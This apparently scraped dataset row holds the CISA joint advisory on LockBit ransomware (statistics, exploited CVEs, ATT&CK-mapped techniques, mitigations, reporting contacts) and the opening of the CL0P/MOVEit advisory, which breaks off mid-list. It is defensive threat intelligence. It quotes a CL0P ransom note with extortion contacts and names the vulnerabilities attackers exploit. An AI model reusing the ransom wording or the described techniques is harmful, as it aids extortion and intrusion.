[10] Intelligence agency says ransomware group with Russian ties poses 'an enduring threat' to Canada






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0008', 'T1562.001', 'T1071.002', 'T1021.002', 'T1569.002', 'T1219', 'T1490', 'TA0010', 'T1482', 'T1562', 'T1567', 'T1190', 'T1560.001', 'T1484.001', 'T1110', 'T1003.001', 'T1572', 'T1082', 'T1614.001', 'T1567.002', 'T1027', 'T1547', 'T1078', 'T1489', 'T1070.004', 'T1072', 'T1003', 'T1046', 'T1566', 'T1480.001', 'T1133', 'TA0002', 'T1027.002', 'T1548', 'T1491.001', 'T1021.001', 'T1189', 'T1071.001', 'T1486', 'TA0004', 'T1095', 'T1059.003', 'T1485', 'T1070.001', 'T1555.003', 'T1048'}","



SUMMARY
In 2022, LockBit was the most deployed ransomware variant across the world and continues to be prolific in 2023. Since January 2020, affiliates using LockBit have attacked organizations of varying sizes across an array of critical infrastructure sectors, including financial services, food and agriculture, education, energy, government and emergency services, healthcare, manufacturing, and transportation. LockBit ransomware operation functions as a Ransomware-as-a-Service (RaaS) model where affiliates are recruited to conduct ransomware attacks using LockBit ransomware tools and infrastructure. Due to the large number of unconnected affiliates in the operation, LockBit ransomware attacks vary significantly in observed tactics, techniques, and procedures (TTPs). This variance in observed ransomware TTPs presents a notable challenge for organizations working to maintain network security and protect against a ransomware threat.
The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), the Multi-State Information Sharing and Analysis Center (MS-ISAC), and the following international partners, hereafter referred to as “authoring organizations,” are releasing this Cybersecurity Advisory (CSA) detailing observed activity in LockBit ransomware incidents and providing recommended mitigations to enable network defenders to proactively improve their organization’s defenses against this ransomware operation. 

Australian Cyber Security Centre (ACSC)
Canadian Centre for Cyber Security (CCCS)
United Kingdom’s National Cyber Security Centre (NCSC-UK)
National Cybersecurity Agency of France (ANSSI)
Germany’s Federal Office for Information Security (BSI)
New Zealand’s Computer Emergency Response Team (CERT NZ) and National Cyber Security Centre (NCSC NZ) 

The authoring organizations encourage the implementation of the recommendations found in this CSA to reduce the likelihood and impact of future ransomware incidents.


Understanding Ransomware Threat Actors: LockBit
(PDF,       1.24 MB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 13.1. See the MITRE ATT&CK Tactics and Techniques section for tables of LockBit’s activity mapped to MITRE ATT&CK® tactics and techniques.
Introduction
The LockBit RaaS and its affiliates have negatively impacted organizations, both large and small, across the world. In 2022, LockBit was the most active global ransomware group and RaaS provider in terms of the number of victims claimed on their data leak site.,1, A RaaS cybercrime group maintains the functionality of a particular ransomware variant, sells access to that ransomware variant to individuals or groups of operators (often referred to as “affiliates”), and supports affiliates’ deployment of their ransomware in exchange for upfront payment, subscription fees, a cut of profits, or a combination of upfront payment, subscription fees, and a cut of profits. Some of the methods LockBit has used to successfully attract affiliates include, but are not limited to:

Assuring payment by allowing affiliates to receive ransom payments before sending a cut to the core group; this practice stands in stark contrast to other RaaS groups who pay themselves first and then disburse the affiliates’ cut.
Disparaging other RaaS groups in online forums.
Engaging in publicity-generating activities stunts, such as paying people to get LockBit tattoos and putting a $1 million bounty on information related to the real-world identity of LockBit’s lead who goes by the persona “LockBitSupp.”
Developing and maintaining a simplified, point-and-click interface for its ransomware, making it accessible to those with a lower degree of technical skill.,2, 3,

LockBit has been successful through innovation and ongoing development of the group’s administrative panel and the RaaS supporting functions. In parallel, affiliates that work with LockBit and other notable variants are constantly revising the TTPs used for deploying and executing ransomware.
Table 1 shows LockBit RaaS’s innovation and development.
Table 1: Evolution of LockBit RaaS

LockBit 2.0, LockBit 3.0, LockBit Green, and LockBit Linux-ESXi Locker are still available for affiliates’ use on LockBit’s panel.
LockBit Statistics
Percentage of ransomware incidents attributed to LockBit:

Australia: From April 1, 2022, to March 31, 2023, LockBit made up 18% of total reported Australian ransomware incidents. This figure includes all variants of LockBit ransomware, not solely LockBit 3.0.
Canada: In 2022, LockBit was responsible for 22% of attributed ransomware incidents in Canada.,10,
New Zealand: In 2022, CERT NZ received 15 reports of LockBit ransomware, representing 23% of 2022 ransomware reports.
United States: In 2022, 16% of the State, Local, Tribal, and Tribunal (SLTT) government ransomware incidents reported to the MS-ISAC were identified as LockBit attacks. This included ransomware incidents impacting municipal governments, county governments, public higher education and K-12 schools, and emergency services (e.g., law enforcement).

Number of LockBit ransomware attacks in the U.S. since 2020:

About 1,700 attacks according to the FBI.

Total of U.S. ransoms paid to LockBit:

Approximately $91M since LockBit activity was first observed in the U.S. on January 5, 2020.

Earliest observed LockBit activity:

Australia: The earliest documented occurrence of LockBit 3.0 was in early August 2022.
Canada: The first recorded instance of LockBit activity in Canada was in March 2020.
New Zealand: The first recorded incident involving LockBit ransomware was in March 2021.
United States: LockBit activity was first observed on January 5, 2020.

Most recently observed LockBit activity:

Australia: April 21, 2023.
New Zealand: February 2023.
United States: As recently as May 25, 2023.

Operational activity related to LockBit in France
Since the first case in July 2020 to present, ANSSI has handled 80 alerts linked to the LockBit ransomware, which accounts for 11% of all ransomware cases handled by ANSSI in that period. In about 13% of those cases, ANSSI was not able to confirm nor deny the breach of its constituents’ networks – as the alerts were related to the threat actor’s online claims. So far, 69 confirmed incidents have been handled by ANSSI. Table 2 shows the LockBit activity observed by ANSSI versus overall ransomware activity tracked by the Computer Emergency Response Team-France (CERT-FR).
Table 2: ANSSI-Observed LockBit vs. Overall Ransomware Activity

Table 3 shows the number of instances different LockBit strains were observed by ANSSI from July 2020 to present.
Table 3: ANSSI-Observed LockBit Strain and Number of Instances

* Name either obtained from ANSSI’s or the victim’s investigations** Includes incidents with multiple strains

 


Figure 1: ANSSI-Observed LockBit Strains by Year
From the incidents handled, ANSSI can infer that LockBit 3.0 widely took over from LockBit 2.0 and the original LockBit strain from 2022. In two cases, victims were infected with as many as three different strains of LockBit (LockBit 2.0/Red, LockBit 3.0/Black, and LockBit Green).
Leak Sites
The authoring agencies observe data leak sites, where attackers publish the names and captured data of victims if they do not pay ransom or hush money. Additionally, these sites can be used to record alleged victims who have been threatened with a data leak. The term 'victims' may include those who have been attacked, or those who have been threatened or blackmailed (with the attack having taken place).
The leak sites only show the portion of LockBit affiliates’ victims subjected to secondary extortion. Since 2021, LockBit affiliates have employed double extortion by first encrypting victim data and then exfiltrating that data while threatening to post that stolen data on leak sites. Because LockBit only reveals the names and leaked data of victims who refuse to pay the primary ransom to decrypt their data, some LockBit victims may never be named or have their exfiltrated data posted on leak sites. As a result, the leak sites reveal a portion of LockBit affiliates’ total victims. For these reasons, the leak sites are not a reliable indicator of when LockBit ransomware attacks occurred. The date of data publication on the leak sites may be months after LockBit affiliates actually executed ransomware attacks.
Up to the Q1 2023, a total of 1,653 alleged victims were observed on LockBit leak sites. With the introduction of LockBit 2.0 and LockBit 3.0, the leak sites have changed, with some sources choosing to differentiate leak sites by LockBit versions and others ignoring any differentiation. Over time, and through different evolutions of LockBit, the address and layout of LockBit leak sites have changed and are aggregated under the common denominator of the LockBit name. The introduction of LockBit 2.0 at the end of the Q2 2021 had an immediate impact on the cybercriminal market due to multiple RaaS operations shutting down in May and June 2021 (e.g., DarkSide and Avaddon). LockBit competed with other RaaS operations, like Hive RaaS, to fill the gap in the cybercriminal market leading to an influx of LockBit affiliates. Figure 2 shows the alleged number of victims worldwide on LockBit leak sites starting in Q3 2020. Figure 2 shows the alleged number of victims worldwide on LockBit leak sites starting in Q3 2020.

 


Figure 2: Alleged Number of Victims Worldwide on LockBit Leak Sites
Tools
During their intrusions, LockBit affiliates have been observed using various freeware and open-source tools that are intended for legal use. When repurposed by LockBit, these tools are then used for a range of malicious cyber activity, such as network reconnaissance, remote access and tunneling, credential dumping, and file exfiltration. Use of PowerShell and batch scripts are observed across most intrusions, which focus on system discovery, reconnaissance, password/credential hunting, and privilege escalation. Artifacts of professional penetration-testing tools such as Metasploit and Cobalt Strike have also been observed.
Table 4 shows a list of legitimate freeware and open-source tools LockBit affiliates have repurposed for ransomware operations. The legitimate freeware and open-source tools mentioned in this product are all publicly available and legal. The use of these tools by a threat actor should not be attributed to the freeware and open-source tools, absent specific articulable facts tending to show they are used at the direction or under the control of a threat actor.
Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates

Common Vulnerabilities and Exposures (CVEs) Exploited
Based on secondary sources, it was noted that affiliates exploit older vulnerabilities like CVE-2021-22986, F5 iControl REST unauthenticated Remote Code Execution Vulnerability, as well as newer vulnerabilities such as:

CVE-2023-0669: Fortra GoAnyhwere Managed File Transfer (MFT) Remote Code Execution Vulnerability
CVE-2023-27350: PaperCut MF/NG Improper Access Control Vulnerability

LockBit affiliates have been documented exploiting numerous CVEs, including:

CVE-2021-44228: Apache Log4j2 Remote Code Execution Vulnerability,
CVE-2021-22986: F5 BIG-IP and BIG-IQ Centralized Management iControl REST Remote Code Execution Vulnerability,
CVE-2020-1472: NetLogon Privilege Escalation Vulnerability,
CVE-2019-0708: Microsoft Remote Desktop Services Remote Code Execution Vulnerability, and
CVE-2018-13379: Fortinet FortiOS Secure Sockets Layer (SSL) Virtual Private Network (VPN) Path Traversal Vulnerability.

For further information on these CVEs, see CISA’s Known Exploited Vulnerabilities (KEV) Catalog.
Post Detonation TTPs
When LockBit affiliates target an organization responsible for managing other organizations’ networks, CERT NZ has observed LockBit affiliates attempt secondary ransomware extortion after detonation of the LockBit variant on the primary target. Once the primary target is hit, LockBit affiliates then attempt to extort the companies that are customers of the primary target. This extortion is in the form of secondary ransomware that locks down services those customers consume. Additionally, the primary target’s customers may be extorted by LockBit affiliates threatening to release those customers’ sensitive information.
MITRE ATT&CK Tactics and Techniques
Tables 5-16 show the LockBit affiliate tactics and techniques referenced in this advisory.
Table 5: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Initial Access

Table 6: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Execution

 
 

Table 7: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Persistence

Table 8: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Privilege Escalation

Table 9: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Defense Evasion

Table 10: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Credential Access

Table 11: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Discovery

Table 12: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Lateral Movement

Table 13: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Collection

Table 14: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Command and Control

Table 15: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Exfiltration

Table 16: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Impact

Mitigations
The authoring organizations recommend implementing the mitigations listed below to improve their cybersecurity posture to better defend against LockBit’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
The listed mitigations are ordered by MITRE ATT&CK tactic. Mitigations that apply to multiple MITRE ATT&CK tactics are listed under the tactic that occurs earliest in an incident’s lifecycle. For example, account use polices are mitigations for initial access, persistence, privilege escalation, and credential access but would be listed under initial access mitigations.
Initial Access

Consider implementing sandboxed browsers to protect systems from malware originating from web browsing. Sandboxed browsers isolate the host machine from malicious code.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST standards for developing and managing password policies,CPG 2.L,.

Enforce use of longer passwords consisting of at least 15 characters in length,CPG 2.B, 2.C,.
Store passwords in a salted and hashed format using industry-recognized password hashing algorithms.
Prevent use of commonly used or known-compromised passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software,CPG 2.Q,.


Implement filters at the email gateway to filter out emails with known malicious indicators, such as known malicious subject lines, and block suspicious IP addresses at the firewall,CPG 2.M,.
Install a web application firewall and configure with appropriate rules to protect enterprise assets.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Isolate web-facing applications to further minimize the spread of ransomware across a network,CPG 2.F,.
Follow the least-privilege best practice by requiring administrators to use administrative accounts for managing systems and use simple user accounts for non-administrative tasks,CPG 2.E,.
Enforce the management of and audit user accounts with administrative privileges. Configure access controls according to the principle of least privilege,CPG 2.E,. 
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Public-facing applications must be patched in a timely manner as vulnerabilities can often be exploited directly by the threat actor. By closely monitoring the threat landscape, threat actors often take advantage of vulnerabilities before systems are patched. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours from when a vulnerability is disclosed. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.
Restrict service accounts from remotely accessing other systems. Configure group policy to Deny log on locally, Deny log on through Terminal Services, and Deny access to this computer from the network for all service accounts to limit the ability for compromised service accounts to be used for lateral movement.
Block direct internet access for administration interfaces (e.g., application protocol interface (API)) and for remote access.
Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks, and privileged accounts that access critical systems,CPG 2.H,.
Consolidate, monitor, and defend internet gateways.
Install, regularly update, and enable real-time detection for antivirus software on all hosts.
Raise awareness for phishing threats in your organization. Phishing is one of the primary infection vectors in ransomware campaigns, and all employees should receive practical training on the risks associated with the regular use of  email. With the rise of sophisticated phishing methods, such as using stolen email communication or artificial intelligence (AI) systems such as ChatGPT, the distinction between legitimate and malicious emails becomes more complex. This particularly applies to employees from corporate divisions that have to deal with a high volume of external email communication (e.g., staff recruitment),CPG 2.I, 2.J,.
Consider adding an external email warning banner for emails sent to or received from outside of your organization,CPG 2.M,.
Review internet-facing services and disable any services that are no longer a business requirement to be exposed or restrict access to only those users with an explicit requirement to access services, such as SSL, VPN, or RDP. If internet-facing services must be used, control access by only allowing access from an admin IP range,CPG 2.X,.
 Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Regularly verify the security level of the Active Directory domain by checking for misconfigurations.

Execution

Develop and regularly update comprehensive network diagram(s) that describes systems and data flows within your organization’s network(s),CPG 2.P,.
Control and restrict network connections accordingly with a network flow matrix.
Enable enhanced PowerShell logging,CPG 2.T, 2.U,.

PowerShell logs contain valuable data, including historical OS, registry interaction, and possibility of a threat actor’s PowerShell use.
Ensure PowerShell instances are configured to use the latest version, and have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. It is recommended to turn on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as reasonably practical.


Configure the Windows Registry to require UAC approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.

Privilege Escalation

Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally,CPG 2.N,.
Enable Credential Guard to protect your Windows system credentials. This is enabled by default on Windows 11 Enterprise 22H2 and Windows 11 Education 22H2. Credential Guard prevents credential dumping techniques of the Local Security Authority (LSA) secrets. Be aware that enabling this security control has some downsides. In particular, you can no longer use New Technology Local Area Network (LAN) Manager (NTLM) classic authentication single sign-on, Kerberos unconstrained delegation, as well as Data Encryption Standard (DES) encryption.
Implement Local Administrator Password Solution (LAPS) where possible if your OS is older than Windows Server 2019 and Windows 10 as these versions do not have LAPS built in. NOTE: The authoring organizations recommend organizations upgrade to Windows Server 2019 and Windows 10 or greater.

Defense Evasion

Apply local security policies to control application execution (e.g., Software Restriction Policies (SRP), AppLocker, Windows Defender Application Control (WDAC)) with a strict allowlist.
Establish an application allowlist of approved software applications and binaries that are allowed to be executed on a system. This measure prevents unwanted software to be run. Usually, application allowlist software can also be used to define blocklists so that the execution of certain programs can be blocked, for example cmd.exe or PowerShell.exe,CPG 2.Q,.

Credential Access

Restrict NTLM uses with security policies and firewalling.

Discovery

Disable unused ports. Disable ports that are not being used for business purposes (e.g., RDP-TCP Port 3389). Close unused RDP ports.

Lateral Movement

Identify Active Directory control paths and eliminate the most critical among them according to the business needs and assets.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network,CPG 1.E,. EDR tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.

Command and Control

Implement a tiering model by creating trust zones dedicated to an organization’s most sensitive assets.
VPN access should not be considered as a trusted network zone. Organizations should instead consider moving to zero trust architectures.

Exfiltration

Block connections to known malicious systems by using a Transport Layer Security (TLS) Proxy. Malware often uses TLS to communicate with the infrastructure of the threat actor. By using feeds for known malicious systems, the establishment of a connection to a C2 server can be prevented.
Use web filtering or a Cloud Access Security Broker (CASB) to restrict or monitor access to public-file sharing services that may be used to exfiltrate data from a network.

Impact

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, the cloud),CPG 2.R,.
Maintain offline backups of data, and regularly maintain backup and restoration (daily or weekly at the minimum). By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data,CPG 2.R,. ACSC recommends organizations follow the 3-2-1 backup strategy in which organizations have three copies of data (one copy of production data and two backup copies) on two different media, such as disk and tape, with one copy kept off-site for disaster recovery.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.R,.

Implement Mitigations for Defense-in-Depth
Implementing multiple mitigations within a defense-in-depth approach can help protect against ransomware, such as LockBit. CERT NZ explains How ransomware happens and how to stop it by applying mitigations, or critical controls, to provide a stronger defense to detect, prevent, and respond to ransomware before an organization’s data is encrypted. By understanding the most common attack vectors, organizations can identify gaps in network defenses and implement the mitigations noted in this advisory to harden organizations against ransomware attacks. In Figure 3, a ransomware attack is broken into three phases:

Initial Access where the cyber actor is looking for a way into a network.
Consolidation and Preparation when the actor is attempting to gain access to all devices.
Impact on Target where the actor is able to steal and encrypt data and then demand ransom.

Figure 3 shows the mitigations/critical controls, as various colored hexagons, working together to stop a ransomware attacker from accessing a network to steal and encrypt data. In the Initial Access phase, mitigations working together to deny an attacker network access include securing internet-exposed services, patching devices, implementing MFA, disabling macros, employing application allowlisting, and using logging and alerting. In the Consolidation and Preparation phase, mitigations working together to keep an attacker from accessing network devices are patching devices, using network segmentation, enforcing the principle of least privilege, implementing MFA, and using logging and alerting. Finally, in the Impact on Target phase, mitigations working together to deny or degrade an attacker’s ability to steal and/or encrypt data includes using logging and alerting, using and maintaining backups, and employing application allowlisting.

 


 Critical Controls Key

 


Figure 3: Stopping Ransomware Using Layered Mitigations
Validate Security Controls
In addition to applying mitigations, the authoring organizations recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring organizations recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 5-16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
Resources

ACSC:

See 2023-03: ACSC Ransomware Profile – LockBit 3.0 for additional information.


CISA:

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Information on no-cost cyber hygiene services is available at Cyber Hygiene Services and Ransomware Readiness Assessment.


CISA, NSA, FBI, and MS-ISAC:

See the #StopRansomware Guide developed through the Joint Ransomware Task Force (JRTF) to provide a one-stop resource to help organizations reduce the risk of ransomware incidents through best practices to detect, prevent, respond, and recover, including step-by-step approaches to address potential attacks.


FBI and CISA:

See Alert AA23-075A - #StopRansomware: LockBit 3.0 for information on IOCs and TTPs identified through FBI investigations as recently as March 2023.


MS-ISAC:

See the Center for Internet Security (CIS) Critical Security Controls (CIS Controls) https://www.cisecurity.org/insights/white-papers/cis-community-defense-model-2-0for information on strengthening an organization’s cybersecurity posture through implementing a prescriptive, prioritized, and simplified set of best.
See the CIS Community Defense Model 2.0 (CDM 2.0) for the effectiveness of the CIS Controls against the most prevalent types of attacks and how CDM 2.0 can be used to design, prioritize, implement, and improve an organization’s cybersecurity program.
See Blueprint for Ransomware Defense for a clear, actionable framework for ransomware mitigation, response, and recovery built around the CIS Controls.


NCSC-UK

See guidance on Mitigating malware and ransomware attacks for information on defending organizations against malware or ransomware attacks.


BSI:

See BSI’s Ransomware – Facts and Defense Strategies for a comprehensive collection of resources on ransomware prevention, detection, and reaction. Note: These resources are in German.


CCCS:

See CCCS’s Ransomware playbook (ITSM.00.099) for information on ransomware prevention and response.
See CCCS’s Top 10 IT security actions based on analysis of cyber threat trends to help minimize intrusions or the impacts of a successful cyber intrusion.


CERT NZ:

See CERT NZ’s Security awareness building and Creating an effective security awareness program to assist organization’s in providing adequate security awareness and training to personnel while creating a positive security culture.
Businesses can find information on developing an incident response plan, creating a contact list, and communicating ransomware incidents at CERT NZ’s Creating an incident response plan.


NCSC NZ:

For guidance on ransomware for public service agencies, see NCSC NZ’s Ransomware: Your organization should be both protected and prepared.



Reporting
The authoring organizations do not encourage paying ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the authoring organizations urge you to promptly report ransomware incidents to your country’s respective authorities.

Australia: Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au.
Canada: Canadian victims of ransomware are encouraged to consider reporting cyber incidents to law enforcement (e.g., local police or the Canadian Anti-Fraud Centre) as well as to the Canadian Centre for Cyber Security online via My Cyber Portal.
France:

Individuals and small organizations can seek assistance with Cybermalveillance – https://www.cybermalveillance.gouv.fr/.
Larger organizations, as well as public and regulated entities, can request assistance from CERT-FR via cert-fr@ssi.gouv.fr.


Germany: German victims of ransomware are encouraged to consider reporting cyber incidents to law enforcement (e.g., local police or the Central Contact Point for Cybercrime as well as to the Federal Office for Information Security (BSI) via the Reporting and Information Portal.
New Zealand: New Zealand organizations and businesses can report security incidents to the NCSC at incidents@ncsc.govt.nz or call 04 498 7654, or to CERT NZ through https://www.cert.govt/nz/it-specialists/report-an-incident/ or to ir@ops.cert.govt.nz.
United States:

Report ransomware incidents to a local FBI Field Office or CISA’s 24/7 Operations Center at Report@cisa.dhs.gov, cisa.gov/report, or 1-844-Say-CISA (1-844-729-2472). When available, please include the information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
For SLTTs, email soc@msisac.org or call (866) 787-4722.


United Kingdom: UK organizations should report any suspected compromises to NCSC.

Disclaimer
The information in this report is being provided “as is” for informational purposes only. The authoring organizations do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring organizations.
References,1, LockBit, BlackCat, and Royal Dominate the Ransomware Scene,2, Ransomware Diaries: Volume 1,3, What is LockBit ransomware and how does it operate?,4, Ransomware Spotlight: LockBit,5, Analysis and Impact of LockBit Ransomware’s First Linux and VMware ESXi Variant,6, A first look at the builder for LockBit 3.0 Black,7, LockBit ransomware gang releases LockBit Green version,8, LockBit Ransomware Now Targeting Apple macOS Devices,9, Apple’s Macs Have Long Escaped Ransomware. That May be Changing,10, Intelligence agency says ransomware group with Russian ties poses 'an enduring threat' to Canada






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
25,"






Actions to take today to mitigate cyber threats from CL0P ransomware: 




Take an inventory of assets and data, identifying authorized and unauthorized devices and software.
Grant admin privileges and access only when necessary, establishing a software allow list that only executes legitimate applications.
Monitor network ports, protocols, and services, activating security configurations on network infrastructure devices such as firewalls and routers
Regularly patch and update software and applications to their latest versions, and conduct regular vulnerability assessments.







Updated June 16, 2023
This CSA is being re-released to remove old Fortra GoAnywhere Campaign IP addresses and to add new IP addresses. See the update below.
End of Update
SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known CL0P ransomware IOCs and TTPs identified through FBI investigations as recently as June 2023.
According to open source information, beginning on May 27, 2023, CL0P Ransomware Gang, also known as TA505, began exploiting a previously unknown SQL injection vulnerability (CVE-2023-34362) in Progress Software's managed file transfer (MFT) solution known as MOVEit Transfer. Internet-facing MOVEit Transfer web applications were infected with a web shell named LEMURLOOT, which was then used to steal data from underlying MOVEit Transfer databases. In similar spates of activity, TA505 conducted zero-day-exploit-driven campaigns against Accellion File Transfer Appliance (FTA) devices in 2020 and 2021, and Fortra/Linoma GoAnywhere MFT servers in early 2023.
FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of CL0P ransomware and other ransomware incidents.
Download the PDF version, STIX and JSON file for this report:


AA23-158A PDF
(PDF,       740.97 KB
  )




AA23-158A STIX XML
(XML,       165.28 KB
  )




AA23-158A JSON
(JSON,       93.33 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
Appearing in February 2019, and evolving from the CryptoMix ransomware variant, CL0P was leveraged as a Ransomware as a Service (RaaS) in large-scale spear-phishing campaigns that used a verified and digitally signed binary to bypass system defenses. CL0P was previously known for its use of the ‘double extortion’ tactic of stealing and encrypting victim data, refusing to restore victim access and publishing exfiltrated data on Tor via the CL0P^_-LEAKS website. In 2019, TA505 actors leveraged CL0P ransomware as the final payload of a phishing campaign involving a macro-enabled document that used a Get2 malware dropper for downloading SDBot and FlawedGrace. In recent campaigns beginning 2021, CL0P preferred to rely mostly on data exfiltration over encryption.
Beyond CL0P ransomware, TA505 is known for frequently changing malware and driving global trends in criminal malware distribution. Considered to be one of the largest phishing and malspam distributors worldwide, TA505 is estimated to have compromised more than 3,000 U.S.-based organizations and 8,000 global organizations.
TA505 has operated:

A RaaS and has acted as an affiliate of other RaaS operations,
As an initial access broker (IAB), selling access to compromised corporate networks,
As a customer of other IABs,
And as a large botnet operator specializing in financial fraud and phishing attacks.

In a campaign from 2020 to 2021, TA505 used several zero-day exploits to install a web shell named DEWMODE on internet-facing Accellion FTA servers. Similarly, the recent exploitation of MOVEit Transfer, a SQL injection vulnerability was used to install the web shell, which enabled TA505 to execute operating system commands on the infected server and steal data.
In late January 2023, the CL0P ransomware group launched a campaign using a zero-day vulnerability, now catalogued as CVE-2023-0669, to target the GoAnywhere MFT platform. The group claimed to have exfiltrated data from the GoAnywhere MFT platform that impacted approximately 130 victims over the course of 10 days. Lateral movement into the victim networks from the GoAnywhere MFT was not identified, suggesting the breach was limited to the GoAnywhere platform itself. Over the next several weeks, as the exfiltrated data was parsed by the group, ransom notes were sent to upper-level executives of the victim companies, likely identified through open source research. The ransom notes threatened to publish the stolen files on the CL0P data leak site if victims did not pay the ransom amount.

Figure 1: CL0P Ransom Note



Hello, this is the CL0P hacker group. As you may know, we recently carried out a hack, which was reported in the news on site [redacted].
We want to inform you that we have stolen important information from your GoAnywhere MFT resource and have attached a full list of files as evidence.
We deliberately did not disclose your organization and wanted to negotiate with you and your leadership first. If you ignore us, we will sell your information on the black market and publish it on our blog, which receives 30-50 thousand unique visitors per day. You can read about us on [redacted] by searching for CLOP hacker group.
You can contact us using the following contact information:x
unlock@rsv-box[.]com
and
unlock@support-mult[.]com




CL0P’s toolkit contains several malware types to collect information, including the following:

FlawedAmmyy/FlawedGrace remote access trojan (RAT) collects information and attempts to communicate with the Command and Control (C2) server to enable the download of additional malware components [T1071], [T1105].
SDBot RAT propagates the infection, exploiting vulnerabilities and dropping copies of itself in removable drives and network shares [T1105]. It is also capable of propagating when shared though peer-to-peer (P2P) networks. SDBot is used as a backdoor [T1059.001] to enable other commands and functions to be executed in the compromised computer. This malware uses application shimming for persistence and to avoid detection [T1546.011].
